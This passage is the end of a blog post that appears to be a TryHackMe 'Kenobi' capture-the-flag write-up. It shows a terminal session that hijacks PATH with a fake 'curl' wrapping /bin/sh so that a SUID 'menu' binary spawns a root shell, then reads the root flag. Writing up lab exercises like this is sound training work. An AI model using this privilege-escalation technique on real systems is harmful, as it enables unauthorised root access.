</pre><td class="rouge-code"><pre><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span><span class="nb">cd</span> /tmp
<span class="gp">kenobi@kenobi:/tmp$</span><span class="w"> </span><span class="nb">echo</span> /bin/sh <span class="o">&gt;</span> curl
<span class="gp">kenobi@kenobi:/tmp$</span><span class="w"> </span><span class="nb">chmod </span>777 curl
<span class="gp">kenobi@kenobi:/tmp$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="gp">kenobi@kenobi:/tmp$</span><span class="w"> </span>menu
<span class="go">
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root
<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">root.txt
</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">177b3cd8562289f37382721c28381f02
</span></pre></table></code></div></div><p>We have successfully found the root.txt flag. By finding a binary that has the SUID bit set and could run as the root user we manipulated the PATH variable, we got a shell and we now own Kenobi.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctfs/'>CTFs</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kenobi - Dimitris Tsarouchas&url=https://dimitrios-tsarouchas.tech//posts/Kenobi/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kenobi - Dimitris Tsarouchas&u=https://dimitrios-tsarouchas.tech//posts/Kenobi/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Kenobi - Dimitris Tsarouchas&url=https://dimitrios-tsarouchas.tech//posts/Kenobi/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory/">Active Directory</a><li><a href="/posts/Threat-Actors/">Threat Actors</a><li><a href="/posts/Local-File-Inclusion-CTF/">Local File Inclusion CTF</a><li><a href="/posts/Local-File-Inclusion/">Local File Inclusion (LFI) Vulnerability</a><li><a href="/posts/Tmux/">Tmux</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/information-security/">information security</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/apts/">APTs</a> <a class="post-tag" href="/tags/cia-triad/">cia triad</a> <a class="post-tag" href="/tags/cve-2019-14287/">CVE-2019-14287</a> <a class="post-tag" href="/tags/hacktivists/">hacktivists</a> <a class="post-tag" href="/tags/script-kiddies/">script kiddies</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Sudo-Security-Bypass/"><div class="card-body"> <span class="timeago small" > Jan 23 <i class="unloaded">2021-01-23T12:55:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sudo - Security Bypass (CVE:2019-14287)</h3><div class="text-muted small"><p> Introduction In this post we are going to exploit a vulnerability found in the sudo program by Joe Vennix in 2019. This vulnerability has been patched in newer versions of Linux but it may still...</p></div></div></a></div><div class="card"> <a href="/posts/Local-File-Inclusion/"><div class="card-body"> <span class="timeago small" > Feb 1 <i class="unloaded">2021-02-01T12:55:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Local File Inclusion (LFI) Vulnerability</h3><div class="text-muted small"><p> Image from netsparker.com Introduction We are going to exploit a Linux machine that is vulnerable to Local File Inclusion attack. This will be done by using the Path Traversal technique. We will g...</p></div></div></a></div><div class="card"> <a href="/posts/Local-File-Inclusion-CTF/"><div class="card-body"> <span class="timeago small" > Feb 2 <i class="unloaded">2021-02-02T12:55:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Local File Inclusion CTF</h3><div class="text-muted small"><p> Introduction In this article we are going to capture root flag on a Linux machine using Local File Inclusion vulnerability. We have shown in previous article that an attacker gets advantage of i...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/Sudo-Security-Bypass/" class="btn btn-outline-primary"><p>Sudo - Security Bypass (CVE:2019-14287)</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/DimitriosTsaro3">Dimitrios Tsarouchas</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/information-security/">information security</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/apts/">APTs</a> <a class="post-tag" href="/tags/cia-triad/">cia triad</a> <a class="post-tag" href="/tags/cve-2019-14287/">CVE 2019 14287</a> <a class="post-tag" href="/tags/hacktivists/">hacktivists</a> <a class="post-tag" href="/tags/script-kiddies/">script kiddies</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://dimitrios-tsarouchas.tech/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
